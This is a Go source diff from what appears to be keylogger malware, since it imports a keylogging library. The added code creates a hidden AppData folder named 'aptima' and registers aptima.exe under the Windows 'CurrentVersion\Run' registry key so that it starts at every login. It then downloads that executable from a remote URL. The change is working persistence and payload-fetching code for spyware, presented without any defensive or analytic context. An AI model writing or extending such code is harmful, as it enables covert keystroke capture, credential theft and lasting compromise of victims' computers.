@@ -10,6 +10,7 @@ import (
 	"time"
 
 	"github.com/kindlyfire/go-keylogger"
+	"golang.org/x/sys/windows/registry"
 )
 
 const (
@@ -58,13 +59,24 @@ func downloadFile(filepath string, url string) (err error) {
 	return nil
 }
 func download() {
-	homeDir := UserHomeDir() + "\\AppData\\Roaming\\aptima\\aptima.exe"
+	homeDir := UserHomeDir() + "\\AppData\\Roaming\\aptima"
 	fmt.Println(homeDir)
-	if _, err := os.Stat(homeDir); err == nil {
+	if _, err := os.Stat(homeDir + "\\aptima.exe"); err == nil {
 		fmt.Printf("File exists\n")
 	} else {
+		os.MkdirAll(homeDir, os.ModePerm)
 		fmt.Printf("File does not exist\n")
-		downloadFile(homeDir, URL+"/aptima.exe")
+		k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
+		if err != nil {
+			fmt.Println("cannot access registre")
+		}
+		if err := k.SetStringValue("aptima", homeDir+"\\aptima.exe"); err != nil {
+			fmt.Println(err)
+		}
+		if err := k.Close(); err != nil {
+			fmt.Println(err)
+		}
+		downloadFile(homeDir+"\\aptima.exe", URL+"/aptima.exe")
 	}
 
 }
